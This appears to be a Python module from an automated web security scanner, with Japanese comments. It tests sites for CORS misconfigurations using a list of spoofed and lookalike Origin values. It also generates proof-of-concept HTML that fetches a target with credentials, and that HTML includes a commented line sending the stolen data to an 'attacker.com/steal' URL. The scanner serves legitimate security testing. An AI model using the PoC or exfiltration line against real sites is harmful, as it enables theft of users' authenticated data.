"""
CORS Tester - CORS設定ミステスター

Origin検証バイパス検出
"""

import asyncio
import logging
from typing import List, Dict, Optional
from dataclasses import dataclass

import httpx

logger = logging.getLogger(__name__)


@dataclass
class CORSResult:
    """CORS検出結果"""
    url: str
    test_origin: str
    vulnerable: bool = False
    acao_header: str = ""  # Access-Control-Allow-Origin
    acac_header: str = ""  # Access-Control-Allow-Credentials
    misconfiguration: str = ""
    severity: str = "medium"


class CORSTester:
    """
    CORS設定ミステスター
    
    機能:
    - Origin検証バイパス
    - ワイルドカード検出
    - Credentials許可検出
    - サブドメイン許可検出
    """
    
    def __init__(self, target_domain: str = None, auth_headers: Optional[Dict] = None):
        self.target_domain = target_domain
        self.auth_headers: Dict = auth_headers or {}
        self.results: List[CORSResult] = []

    TIMEOUT = 10
    
    def generate_test_origins(self, target_domain: str) -> List[str]:
        """
        テスト用Origin生成
        
        Returns:
            テスト用Origin一覧
        """
        base = target_domain.replace("www.", "")
        
        return [
            # 完全に外部
            "https://evil.com",
            "https://attacker.com",

            # ドメイン類似（古典的バイパス）
            f"https://{base}.evil.com",
            f"https://evil.{base}",
            f"https://{base}evil.com",
            f"https://evil{base}",

            # サブドメイン偽装
            f"https://sub.{base}",
            f"https://test.{base}",

            # Null Origin（iframe sandbox等でのバイパス）
            "null",

            # プロトコル違い（HTTPS->HTTP）
            f"http://{base}",

            # endsWith バイパス（正規表現末尾チェック欠陥）
            f"https://not{base}",

            # 特殊文字による正規表現エスケープ回避
            f"https://{base}_.evil.com",

            # ポート付きホスト名の正規表現バイパス
            f"https://{base}:8443",

            # 内部ループバックIP信頼確認
            "https://localhost",
            "https://127.0.0.1",
        ]
    
    def test(self, url: str) -> List[CORSResult]:
        """
        CORS設定テスト
        
        Args:
            url: テスト対象URL
        """
        # ドメイン抽出
        from urllib.parse import urlparse
        parsed = urlparse(url)
        domain = parsed.netloc
        
        test_origins = self.generate_test_origins(domain)
        results = []
        
        for origin in test_origins:
            result = self._test_origin(url, origin)
            if result:
                results.append(result)
                self.results.append(result)
        
        return results
    
    def _test_origin(self, url: str, origin: str) -> Optional[CORSResult]:
        """
        Origin検証テスト
        """
        logger.debug("Testing CORS: Origin=%s on %s", origin, url)
        request_headers = {**self.auth_headers, "Origin": origin}
        try:
            with httpx.Client(timeout=self.TIMEOUT, follow_redirects=False) as client:
                response = client.get(url, headers=request_headers)
        except Exception as exc:
            logger.debug("CORS request failed for origin %s: %s", origin, exc)
            return None

        acao = response.headers.get("Access-Control-Allow-Origin", "")
        acac = response.headers.get("Access-Control-Allow-Credentials", "")
        vulnerable, misconfiguration = self._is_vulnerable(origin, acao, acac)

        if vulnerable:
            sev = "high" if acac.lower() == "true" else "medium"
            return CORSResult(
                url=url,
                test_origin=origin,
                vulnerable=True,
                acao_header=acao,
                acac_header=acac,
                misconfiguration=misconfiguration,
                severity=sev,
            )
        return None
    
    def _is_vulnerable(
        self,
        test_origin: str,
        acao: str,
        acac: str
    ) -> tuple:
        """
        脆弱性判定

        Returns:
            (vulnerable, misconfiguration_type)
        """
        # ワイルドカード + Credentials（ブラウザは拒否するが設定ミスとして記録）
        if acao == "*" and acac.lower() == "true":
            return True, "wildcard_with_credentials"

        # ワイルドカードのみ
        if acao == "*":
            return True, "wildcard_no_credentials"

        # 任意Originを反射（"evil"依存を除去 → 送信したOriginが返れば全て対象）
        if acao == test_origin and test_origin not in ("", "null"):
            if acac.lower() == "true":
                return True, "origin_reflection_with_credentials"
            return True, "origin_reflection"

        # Null Origin許可（iframe sandboxバイパスに悪用可能）
        if acao == "null":
            return True, "null_origin_allowed"

        return False, ""
    
    def get_vulnerable(self) -> List[CORSResult]:
        """脆弱と判定されたもの"""
        return [r for r in self.results if r.vulnerable]
    
    def get_summary(self) -> Dict:
        """サマリー"""
        by_type = {}
        for r in self.results:
            if r.misconfiguration:
                by_type.setdefault(r.misconfiguration, 0)
                by_type[r.misconfiguration] += 1
        
        return {
            "total_tests": len(self.results),
            "vulnerable": len(self.get_vulnerable()),
            "by_type": by_type,
        }
    
    def get_summary_for_ai(self) -> str:
        """AI向けサマリー"""
        summary = self.get_summary()
        return (
            f"CORS Test: {summary['total_tests']} tests\n"
            f"Vulnerable: {summary['vulnerable']}\n"
            f"Misconfigs: {summary['by_type']}"
        )

    async def scan_async(self, url: str, auth_headers: Optional[Dict] = None) -> List[CORSResult]:
        """
        非同期スキャン（InjectionManager対応）
        """
        if auth_headers:
            self.auth_headers = auth_headers
        return await asyncio.to_thread(self.test, url)

    @staticmethod
    def generate_poc_html(target_url: str, test_origin: str, misconfiguration: str) -> str:
        """
        CORS PoC HTML生成（テンプレートベース、AI不要）
        """
        return (
            f"<!DOCTYPE html>\n"
            f"<html>\n"
            f"<body>\n"
            f"<h2>CORS PoC - {misconfiguration}</h2>\n"
            f"<div id=\"result\"></div>\n"
            f"<script>\n"
            f"fetch(\"{target_url}\", {{\n"
            f"  credentials: \"include\"\n"
            f"}}).then(r => r.text()).then(data => {{\n"
            f"  document.getElementById(\"result\").innerText = data;\n"
            f"  // In real attack: exfiltrate to attacker server\n"
            f"  // fetch(\"https://attacker.com/steal?data=\" + encodeURIComponent(data))\n"
            f"}});\n"
            f"</script>\n"
            f"</body>\n"
            f"</html>"
        )


def create_cors_tester(target_domain: str = None) -> CORSTester:
    """CORSTester作成ヘルパー"""
    return CORSTester(target_domain)
